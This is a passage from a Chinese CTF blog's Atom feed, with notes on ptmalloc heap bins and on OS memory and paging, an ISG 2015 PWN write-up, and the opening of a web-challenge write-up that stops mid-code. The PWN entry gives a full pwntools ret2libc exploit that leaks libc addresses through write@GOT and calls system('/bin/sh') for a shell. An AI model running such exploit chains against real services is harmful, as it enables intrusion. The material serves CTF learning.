class="line">mchunkptr bins[ NBINS * 2 - 2 ];</span><br></pre></td></tr></table></figure></p><p>数组中的 bins 顺序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 数组第一个为 unsorted bin ，没有排序，内部 chunk 比较杂</span><br><span class="line">2. 数组中第 2 到 63 个为 small bin ， 同一个 small bin 链中的大小相同，两个相邻的 small bin 链中的大小相差字节数为 2*机器字长（即 32 位相差8 ，64位相差 16）</span><br><span class="line">3. 后面的为 large bins，chunk 的 fd 按从大到小排序。</span><br></pre></td></tr></table></figure></p><p>当然还有上面提到的 fast bins，ptmalloc 为了提高分配速度，会把一些小的 bins 分配到 fast bins 中，fast bins 中的每个 P 位（chunk 的使用标记）都被设置为 1，所以不会被合并起来。</p><h2 id="4-bins-们"><a href="#4-bins-们" class="headerlink" title="4. bins 们"></a>4. bins 们</h2><h3 id="4-1-fast-bin"><a href="#4-1-fast-bin" class="headerlink" title="4.1 fast bin"></a>4.1 fast bin</h3><p>为了提高分配效率而设计的 fast bin 将存储一些较小的内存块，它们的 <code>使用位</code><br>永远被置为 1，所以不会被合并起来。</p><p>看两个宏：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ifndef DEFAULT_MXFAST</span><br><span class="line">#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span><br><span class="line"></span><br><span class="line">#define set_max_fast(s)                                                        \</span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure></p><ol><li>ptmalloc 首先会调用 <code>set_max_fast</code> 并把 <code>DEFAULT_MXFAST</code>  传进去，也就是设置 fast bins 中 chunk 的最大值。</li><li>MAX_FAST_SIZE 为 0 时，系统就不会支持 fastbin 。</li><li>当申请空间一个小于或等于 <code>global_max_fast</code> 时，ptmalloc 首先会在 fast bin 查询是否有合适大小的块。</li></ol><p>再来看个东西：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span><br></pre></td></tr></table></figure></p><p>当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后大于 <code>FASTBIN_CONSOLIDATION_THRESHOLD</code>，表明内存碎片比较多了，我们就需要把 <code>fast bins</code> 中的 chunk 都进行合并。</p><p><code>malloc_consolidate</code> 函数可以释放后所有 fastbins 并且将他们和其他的 空闲块 合并。</p><h3 id="4-2-small-bin"><a href="#4-2-small-bin" class="headerlink" title="4.2 small bin"></a>4.2 small bin</h3><p>small bins 有 62 个双向链表，每个链表存储的大小都一致。</p><p>small bins 中每个链表的大小都有规律，即：chunk_size = 2<em>SIZE_INDEX</em>index，例如在 32 位系统下下标为 <code>2</code> 的链表的大小为 2<em>4</em>2 = 16 个字节。</p><p>当然，fast bin 中的 chunk 是有可能会被放到 small bin 中去的，因为他们确实有些重合了。</p><h3 id="4-3-large-bin"><a href="#4-3-large-bin" class="headerlink" title="4.3 large bin"></a>4.3 large bin</h3><ol><li>large bins 共有 63个 bin，每个 bin 中的大小不一致，但有个差值。</li><li>每个 bin 中的 chunk 大小之间公差一致。</li><li>第一个 large bin 的起始 chunk 大小为 512 字节，该组公差为 64B，所以该组可以存储 chunk 的大小范围为： [512,512+64)</li></ol><h3 id="4-4-unsorted-bin"><a href="#4-4-unsorted-bin" class="headerlink" title="4.4 unsorted bin"></a>4.4 unsorted bin</h3><ol><li>乱序的 bins</li><li>放进 unsorted bin 的 chunk 来自：<ol><li>分割完大块后剩余部分，并且该部分要大于 MINSIZE</li><li>释放不属于 fast bin 的 chunk 并且 该 chunk 不和 top chunk 紧邻。</li></ol></li></ol><h3 id="4-5-top-chunk"><a href="#4-5-top-chunk" class="headerlink" title="4.5 top chunk"></a>4.5 top chunk</h3><ol><li>简单理解就是在地址最高的一个 chunk，不属于任何 bins。</li><li>当程序需要分配的内存大小在 bins 中都不满足的情况下，尝试用 <code>top chunk</code> 给程序分配，如果够，则剩余部分继续做 <code>top chunk</code>，如果不够，则申请扩展内存后再分配。</li><li>当邻近 <code>top chunk</code> 的 <code>chunk</code> 被释放后，会合并到 <code>top chunk</code> 中</li></ol><h3 id="4-6-last-remainder"><a href="#4-6-last-remainder" class="headerlink" title="4.6 last remainder"></a>4.6 last remainder</h3><ol><li>当在 <code>small chunk</code> 找不到合适的块时，如果 <code>last remainder chunk</code> 大于要分配的内存，则分割这个 <code>chunk</code> 给用户并将剩余部分继续作为 <code>last remainder chunk</code>，该块好像是放在 <code>unsorted bins</code> 中的。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-什么是-chunk&quot;&gt;&lt;a href=&quot;#1-什么是-chunk&quot; class=&quot;headerlink&quot; title=&quot;1. 什么是 chunk&quot;&gt;&lt;/a&gt;1. 什么是 chunk&lt;/h3&gt;&lt;p&gt;由 malloc 申请的内存称为 chunk&lt;/p&gt;
&lt;h3 i
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-第一页</title>
    <link href="https://liey1.github.io/2018/09/24/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E7%AC%AC%E4%B8%80%E9%A1%B5/"/>
    <id>https://liey1.github.io/2018/09/24/程序员的自我修养-第一页/</id>
    <published>2018-09-24T12:18:19.775Z</published>
    <updated>2018-09-24T14:59:37.551Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="1-2-万变不离其宗"><a href="#1-2-万变不离其宗" class="headerlink" title="1.2 万变不离其宗"></a>1.2 万变不离其宗</h2><blockquote><p>讲了南桥北桥PCI</p></blockquote><p><code>看不懂看不懂。</code></p><blockquote><p>SMP 与多核</p></blockquote><p>什么是 <code>SMP</code>：对称多处理器（Symmetrical Multi-Processing），就是多个 <code>CPU</code> 咯。<br>什么是 <code>多核</code>：两个 <code>CPU</code> 你也买不起，所以良心的资本家们将 <code>CPU</code> 中的 缓存部件共享（据说是比较贵），把核心保留起来。即:<code>多个核心+一个缓存部件</code></p><p><code>除非你想把 CPU 的每一滴油水都榨干，否则可以把多多核和 SMP 看成同一个概念</code></p><p>为什么不升级 CPU 本身而添加多核来提速呢？</p><p>因为人们在制造 CPU 的工艺方面已经达到了物理极限，除非制造工艺有本质的突破。否则 <code>4GHZ</code> 就是 CPU 的天花板了。</p><h2 id="1-3-站得高，望得远"><a href="#1-3-站得高，望得远" class="headerlink" title="1.3 站得高，望得远"></a>1.3 站得高，望得远</h2><p><code>Any problem in computer science can be solved by another layer of indrection.</code></p><p>这节应该是强调了接口的概念：</p><h3 id="接口？"><a href="#接口？" class="headerlink" title="接口？"></a>接口？</h3><blockquote><p>什么是接口？</p></blockquote><p>下层实现，上层使用。</p><p>比如类库中封装了 <code>printf</code> 函数。写代码的时候无需考虑 <code>printf</code> 用汇编的实现方式。所以 Windows 的 C 代码到了 Linux 依然可以编译，即使底层实现 <code>printf</code> 的方法不同（应该不同吧？）</p><p>什么是 <code>硬件规格</code>：驱动程序操作硬件的 <code>接口</code>，定义了如何与硬件通信</p><h2 id="1-4-操作系统做什么"><a href="#1-4-操作系统做什么" class="headerlink" title="1.4 操作系统做什么"></a>1.4 操作系统做什么</h2><h3 id="1-41-别让-CPU-打盹"><a href="#1-41-别让-CPU-打盹" class="headerlink" title="1.41 别让 CPU 打盹"></a>1.41 别让 CPU 打盹</h3><blockquote><p>多道程序的出现</p></blockquote><p>什么是多道程序呢： 聪明的程序员为了让 CPU 忙碌起来，写了个监控程序，当当前程序暂时无需使用 CPU 时（读写硬盘），监控程序就把 CPU 让给正在等待的程序。这就是多到程序。</p><p>多道程序的缺点： 没有优先级，所以有些很急的任务要等很久。想象一下如果点击一下鼠标，十分钟之后才等到 CPU 处理。。</p><blockquote><p>进化成分时系统吧</p></blockquote><p>什么是分时系统： 每个程序在运行一段时间后，程序 <code>主动</code> 让出 CPU 给其他程序。Windows早期版本（如 <code>Windows 3.1</code> 就是这种模式）。程序调用系统接口 <code>Yield 、GetMessage、PeekMessage</code> 时，<code>Window3.1</code> 会判断是否有其他程序正在等待 <code>CPU</code> ，如果有，就暂停当前程序，把 <code>CPU</code> 让给其他程序。</p><p>分时系统缺点： 但是，注意这是程序 <code>主动</code> 让出 <code>CPU</code> 啊。程序要是 <code>while(1)</code> 那你可咋办哟~</p><blockquote><p>多任务系统才是王道啊</p></blockquote><p>什么是多任务系统： 操作系统接管了所有硬件资源并且本身运行在一个受硬件保护的级别。所有应用程序都以 <code>进程</code> 的方式运行在比操作系统权限更低的级别（作弊了呀）。</p><p><code>抢占式</code>是什么： CPU 由操作系统分配。每个进程根据优先级都有机会得到 CPU。但如果运行超过一定时间，系统会暂停该进程，将 CPU 资源分配给其他正在等待的程序。</p><p>（这个模式是操作系统强制剥夺 CPU 资源啊~）</p><p>多任务的缺点： 书中没说他有缺点，那就当他没有缺点吧。</p><h3 id="1-42-设备驱动"><a href="#1-42-设备驱动" class="headerlink" title="1.42 设备驱动"></a>1.42 设备驱动</h3><blockquote><p>这一小节看的我想死，所以没有笔记</p></blockquote><h2 id="1-5-内存不够怎么办？"><a href="#1-5-内存不够怎么办？" class="headerlink" title="1.5 内存不够怎么办？"></a>1.5 内存不够怎么办？</h2><p>早期程序是直接运行在物理内存的。</p><p>假设当前计算机物理空间有 128M ，<code>程序A</code> 需要 10M， <code>程序B</code> 需要 100M，<code>程序C</code> 需要 20M，如果需要同时运行 A 和 B，那么可以很直接的将物理内存中 0-10M 分配给 A，10-110 分配给 B。</p><p>很明显会造成很多问题：</p><ol><li><p>地址空间不隔离<br>所有程序都直接访问物理内存，程序A 可以直接访问 程序B 的数据甚至代码。 </p></li><li><p>使用效率低<br>由于没有管理机制，所以如果现在要运行 C 的话。需要将其他程序暂时移到磁盘里去。但是程序需要连续的空间，所以移动 A 肯定是不够的，所以只能移 B。可以看到整个过程有大量的数据在换入换出，导致效率十分低下</p></li><li><p>运行的地址不确定<br>每次分配的空间地址都不确定，但是数据和跳转时的目标地址都是固定的。这就涉及到重定向的问题了，会在以后讨论</p></li></ol><h3 id="1-51-关于隔离"><a href="#1-51-关于隔离" class="headerlink" title="1.51 关于隔离"></a>1.51 关于隔离</h3><p>第一个问题就是隔离，怎么解决呢？</p><p>聪明的程序员们建立了一个概念：虚拟地址空间。</p><p>虚拟地址空间：假的，不存在的。每个进程只能访问自己的地址空间，有效的做到了隔离<br>物理地址空间：和名字一样，物理存在的。如果地址线有 32 条，那么物理空间就有 2^32 字节（4G）。但是如果你只装了 512 MB 的内存，那物理地址的有效部分为： 0x00000000 ~ 0x1FFFFFFF</p><h3 id="1-52-分段"><a href="#1-52-分段" class="headerlink" title="1.52 分段"></a>1.52 分段</h3><p>分段的基本概念：说回上面的 程序 A 和 程序 B。假设有一个 地址从 0x0000000 到 0x00A00000 的 10M 虚拟空间。然后在物理地址中挑选一块相同大小的空间：0x00110000 到 0x00B10000，将这两块地址空间一一映射。（由软件映射，别问什么软件）</p><p>这里解决了上面提到的 第一个 和 第三个问题：两块没有重叠的空间，当 A 访问超出 0x00A0000 的时候，硬件就会判断这是个非法访问。 </p><blockquote><p>局部性原理</p></blockquote><p>但是第二个问题还是没变啊，依然是每个整个程序的搬入搬出。<br>聪明的程序员总是有解决办法，他们发现：当一个程序运行时，在某个时间段内，只是频繁的使用一小部分数据，也就是说很多数据一段时间内不会被访问到，这就是 tmd <code>局部性原理</code>。</p><p>怎么利用起来了呢？程序员们给方法起了个名：<code>分页</code>。</p><h3 id="1-53-分页"><a href="#1-53-分页" class="headerlink" title="1.53 分页"></a>1.53 分页</h3><p>分页的就是把地址空间人为的分成固定大小的页，页的大小由硬件决定，或者硬件支持多种大小的页，由操作系统选择。</p><p>加载一个程序时先将程序虚拟地址分页，然后将常用的页映射到物理内存，不常用的存在磁盘中（不同程序的有些虚拟页被映射到同一个物理页，实现内存共享）。</p><p>那要访问磁盘中的页时怎么办呢？此时硬件捕获到一个信息：<code>页错误</code>，然后阻塞该程序，将磁盘中的页换入内存中。</p><p>当然也要保护页啦，就好像上面提到的 两个程序用到同一个页时，这个页最好是不能被修改的，不然其中一个修改，另一个可能就读不到想要的数据/代码。每个页都可以设置权限属性，修改这些属性的权限也只有操作系统有。详细的介绍会放在日后。。。（不是我想放在日后）</p><p>虚拟内存的实现需要依靠硬件支持，对不同 CPU 来说是不同的，但是几乎所有的硬件都采用一个叫 MMU 的部件进行页映射，CPU 发出 虚拟地址 经过 MMU 转换成实际地址。 MMU 一般都集成在 CPU 内部。</p><h2 id="1-6-众人拾材火焰高"><a href="#1-6-众人拾材火焰高" class="headerlink" title="1.6 众人拾材火焰高"></a>1.6 众人拾材火焰高</h2><h3 id="1-61-线程基础"><a href="#1-61-线程基础" class="headerlink" title="1.61 线程基础"></a>1.61 线程基础</h3><p>一个标准的线程有：线程ID，当前指令指针，寄存器集合和堆栈。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;1-2-万变不离其宗&quot;&gt;&lt;a href=&quot;#1-2-万变不离其宗&quot; class=&quot;headerlink&quot; title=&quot;1.2 万变不离其宗&quot;&gt;&lt;/a&gt;1.2 万变不离其宗&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;讲了南桥北桥PCI&lt;/p&gt;
&lt;/bloc
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://liey1.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>一道简单的 PWN 题</title>
    <link href="https://liey1.github.io/2018/09/11/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%20PWN%20%E9%A2%98/"/>
    <id>https://liey1.github.io/2018/09/11/一道简单的 PWN 题/</id>
    <published>2018-09-10T18:03:35.220Z</published>
    <updated>2018-10-21T16:51:00.625Z</updated>
    
    <content type="html"><![CDATA[<p>这道貌似是 ISG 2015 年的题了。。</p><h4 id="本题WP"><a href="#本题WP" class="headerlink" title="本题WP"></a><a href="https://blog.csdn.net/csalp/article/details/49956179" target="_blank" rel="noopener">本题WP</a></h4><hr><p>问题：</p><p>跟着栈溢出，将 <code>EIP</code> 覆盖成 write 函数的 <code>plt</code> 值，紧接着 <code>read</code> 的 <code>plt</code> 值，这里让我不解的是：</p><p>为什么 <code>read</code> 的函数被执行了。猜测应该是 <code>write</code> 函数中自带了 <code>ret</code> 指令。明天争取学会用 <code>gdb</code> 调试进 <code>write</code> 函数中吧。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/11/6f86787e404d258e803864226710110b.png" alt="跟着塔主学PWN_1"></p><hr><p>  接上。。尝试用 <code>gdb</code> 进入 <code>write</code> 函数。但是：</p><p>  <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/637ed82540b56bdf80bfce25de0d6fa9.png" alt="跟着塔主学PWN_1"></p><p>  问了表哥后，表哥来了个姿势：先运行，在输入的时候按 <code>CTRL+C</code> （之前确实没学过 <code>gdb</code> ）</p><p> 但是这里，可以整个更直接的：<code>b write</code></p><blockquote><p>运行&gt;</p></blockquote><p> 进入到 <code>write</code> 函数内，首先看看怎么取参数：</p><p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b5e1013340d283a4807f40f5a4ae1930.png" alt="跟着塔主学PWN_2"></p><p> 等会再讲。。</p><p> 再看看最后，发现确实用的 <code>ret</code>（废话，不用 <code>ret</code> 怎么返回）</p><p> <img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/7b9cebf440d477cf80aabfd4e5f027ac.png" alt="跟着塔主学PWN_3"></p><hr><blockquote><p>切入这道题。。。</p></blockquote><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><hr><blockquote><p>首先丢进 <code>ida</code> 里看看</p></blockquote><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/28e6acc54052fee98034609d2c195954.png" alt="跟着塔主学PWN_4"></p><p>很明显的一个缓冲区溢出。。（我也只会缓冲区溢出了）</p><p>这里写的 变量 <code>v1</code> 离 <code>ebp</code> 为 <code>0xC(12)</code> 个位置，但是实际测试为 <code>0x10(16)</code> 个位置。</p><p>这里玩个好玩的。。我们可以用 <code>gdb_pattern</code> 生成一些字符串，发送出去后查看 <code>EIP</code>。将此时的 EIP 记录下来再用 <code>gdb_offset</code> 查看偏移位置，这就是变量离 <code>EIP</code> 的位置了：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cbd6e6064087ae7a807b1e052d714dcc.png" alt="跟着塔主学PWN_5"></p><p>现在我们知道是离 20 个位置。我们可以先溢出玩玩，这里 <code>checksec</code> 发现开启了 <code>NX</code> 。我们可以先用 <code>write</code> 函数试试水。比如就打印 <code>ida</code> 代码中 第 <code>6</code> 行的 <code>write(1, &quot;Welcome to ISG 2015!\nPwn me to get the flag:\n&quot;, 0x2Du);</code></p><p>在 <code>ida</code> 中看看 <code>plt</code> 的 <code>write</code> 地址：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/cd856871401be1558081881ce8cb5aed.png" alt="跟着塔主学PWN_6"></p><p>再在 <code>qira</code> 中看看 <code>welcome to isg..</code> 这段字符串在哪：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f92b00cc4035903880a75c1c61781027.png" alt="跟着塔主学PWN_7"></p><p>因为之前调用的 <code>write</code> 函数就是输出这段字符串，所以这个地址就是那段字符串的地址咯。。</p><blockquote><p>整理一下：</p></blockquote><p>初始栈的结构：</p><table><thead><tr><th>相对地址</th><th>对应值</th></tr></thead><tbody><tr><td>0x0</td><td>变量 v1</td></tr><tr><td>0x4</td><td>…</td></tr><tr><td>0x8</td><td>…</td></tr><tr><td>0x12</td><td>…</td></tr><tr><td>0x16</td><td>ESP</td></tr><tr><td>0x20</td><td>EIP</td></tr></tbody></table><p>所以这里填充 <code>20</code> 位任意字符。再用 <code>write</code> 函数的 <code>plt</code> 地址覆盖 <code>EIP</code>。</p><p>POC 如下：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/d2d4ff8440f9788d80e527c641063ff6.png" alt="跟着塔主学PWN_8"></p><p>看看 <code>qira</code> 中：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9f2c319440cb484480a6294b4d208178.png" alt="跟着塔主学PWN_9"></p><p>看到 write 函数执行了，但是我们没给参数，所以他取到了栈里的默认值，而中间的参数是最明显的，所以我们看看中间的参数位置是多少，方便覆盖。位置是：<code>0xf6fff018</code> ，此时栈顶的地址： <code>0xf6fff008</code> 。</p><p>回到一开始。。在 <code>write</code> 函数的截图中，发现取得参数位置分别是：<code>esp+0x8</code>, <code>esp+0xC</code>,<code>esp+0x10</code>。在取参数之前还有个 <code>push</code> 操作（在 <code>write</code> 函数中，上面的截图有。。），所以取参数得实际位置 <code>+4</code>。所以分别为： <code>esp+0x8</code>，<code>esp+0x10</code>,<code>esp+14</code> 。</p><p>再看个明显点的例子：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/b87ed1aa409520af80e71538c2f30041.png" alt="跟着塔主学PWN_10"></p><p>这里尝试控制参数。。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/9dd7510c40f3350580acd09dd69ca037.png" alt="跟着塔主学PWN_11"></p><p>简单的加法：<code>0x8+0x14 = 0x1C</code></p><hr><blockquote><p>函数调用</p></blockquote><p>ok，别忘了一开始要做的事情，就是再调用一次 <code>write</code> 函数，输出一次 <code>Welcome...</code> 那个字符串。</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/146c078840f88fbc80b5db442a028314.png" alt="跟着塔主学PWN_12"></p><hr><blockquote><p>找基地址</p></blockquote><p>我们可以直接去 <code>GOT</code> 表找 <code>write</code> 函数的地址：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/f4f94db140d1e4e8805b5fde92dabdb1.png" alt="跟着塔主学PWN_13"></p><p>在 <code>GOT</code> 表中找到了 <code>write</code> 函数：<code>0x804a01c</code>。</p><p>改一下 <code>ROP</code> 链，将 <code>write</code> 的实际函数地址打印出来：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/e48331a14064f6d680f358192a29421b.png" alt="跟着塔主学PWN_14"></p><p>可以看到输出了正确的地址。代码中上面的 <code>r.recv</code> 是用来接收一开始输出的那段 <code>welcome...</code>，但是没必要输出（ 不接收的话下面 <code>recv</code> 还是会先接收到这个字符串 ）。</p><blockquote><p>获取 <code>system</code> 地址和 <code>/bin/sh</code> 字符串</p></blockquote><p>通过 <code>ldd</code> 看看这个 <code>二进制</code> 文件用了什么链接库..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ldd pwnme</span><br><span class="line">linux-gate.so.1 =&gt;  (0xf77bc000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000)</span><br><span class="line">/lib/ld-linux.so.2 (0x565e8000)</span><br></pre></td></tr></table></figure><p><code>/lib32/libc.so.6</code> 中有我们想要的，首先是 获取 write 函数的偏移地址，这样就能获取到基地址了，可以用 <code>readelf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep write@</span><br><span class="line">   .....</span><br><span class="line">  2303: 000d9900   119 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>记下来，偏移地址 <code>0xd9900</code>。</p><p>接下是 <code>system</code> 函数偏移地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# readelf -a  /lib32/libc.so.6|grep system@</span><br><span class="line">  ...</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p><code>system</code> 偏移地址是 <code>0x3fe70</code>。。接下来是 <code>/bin/sh</code> ，这个字符串用来传进 <code>system</code> 函数以便获取 <code>shell</code>，这里我们用 <code>ROPgadget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nick-machine:/home/nick/liey# ROPgadget --binary  /lib32/libc.so.6 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0015da8c : /bin/sh</span><br></pre></td></tr></table></figure><hr><blockquote><p>再发送</p></blockquote><p>接下来思考一个问题，就是纵使在发送完一次 <code>shellcode</code> 只会知道了 <code>基地址</code>。但是我们却不能再调用了。。。</p><p>在最前面提到过。<code>write</code> 函数会调用 <code>ret</code>。可以把这个理解成 <code>pop eip</code>。也就是在栈顶中取出 <code>eip</code>。。。那么栈顶是哪呢？</p><p>就是在 <code>write</code> 后以及所有参数的最前面。前面我用 <code>0x61616161</code> 替代了。。</p><p>但是又会遇到一个问题。。就是即使直接调用了 <code>system</code> 函数，函数内取参数是取的 <code>esp+0x8</code>，但是 <code>esp+0x8</code> 这个位置被 <code>write</code> 函数的 <code>0xC</code> 占用了。。</p><p>想一下是那个函数写进这段 <code>shellcode</code> 的。对，<code>main</code> 函数，我们可以调用会 <code>main</code> 函数，再调用一次 <code>shellcode</code>，只不过这次是调用 <code>system</code> 函数，而不是 <code>write</code> 函数。</p><p>(<code>main</code> 函数的位置再 <code>ida</code> 中可以找到)</p><p>完整的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;192.168.1.107&quot;,4000)</span><br><span class="line"></span><br><span class="line">write_plt=0x08048370</span><br><span class="line">main=0x804847d</span><br><span class="line">print(r.recv())</span><br><span class="line"></span><br><span class="line">poc_rop1=[</span><br><span class="line">        write_plt,</span><br><span class="line">        main,</span><br><span class="line">        0x1,</span><br><span class="line">        0x804a01c,</span><br><span class="line">        4,</span><br><span class="line">]</span><br><span class="line">shellcode=&quot;a&quot;*20 + flat(poc_rop1)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">write_offset = 0xd9900</span><br><span class="line">system_offset =0x3fe70</span><br><span class="line"></span><br><span class="line">bin_bash = 0x0015da8c</span><br><span class="line"></span><br><span class="line">base = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base=int(base,16)-write_offset</span><br><span class="line"></span><br><span class="line">system = base + system_offset</span><br><span class="line">bin_str = base + bin_bash</span><br><span class="line"></span><br><span class="line">poc_rop2 = [</span><br><span class="line">        system,</span><br><span class="line">        0x61626364,</span><br><span class="line">        bin_str,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是第二次只需要填充 <code>12</code> 个 字符即可。。</p><p>效果：</p><p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/12/74e7080840f68cf580279c597ba60bbf.png" alt="跟着塔主学PWN_15"></p><hr><h3 id="Done…"><a href="#Done…" class="headerlink" title="Done…."></a>Done….</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道貌似是 ISG 2015 年的题了。。&lt;/p&gt;
&lt;h4 id=&quot;本题WP&quot;&gt;&lt;a href=&quot;#本题WP&quot; class=&quot;headerlink&quot; title=&quot;本题WP&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://blog.csdn.net/csalp/article/
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸笔记管理系统（塔主nb）</title>
    <link href="https://liey1.github.io/2018/09/09/%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <id>https://liey1.github.io/2018/09/09/蓝鲸笔记管理系统/</id>
    <published>2018-09-09T11:59:40.605Z</published>
    <updated>2018-09-24T12:29:30.267Z</updated>
    
    <content type="html"><![CDATA[<h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/7490aba640f5756380392e7b8b4f97c6.zip" target="_blank" rel="noopener">本题源码</a></h4><hr><p>首先先随便注册个，登陆看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/cc52eff0409f44bf80c7adaf12ea54fe.png" alt="前台"></p><p>这里看到个提示一样的东西：访问 <code>/dbinit.sql</code> 拿到 数据库结构。</p><p>再看看地址，首页的 url 地址为：<br><code>http://106.39.10.134:10002/index.php?action=front&amp;mode=index</code></p><p>一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span 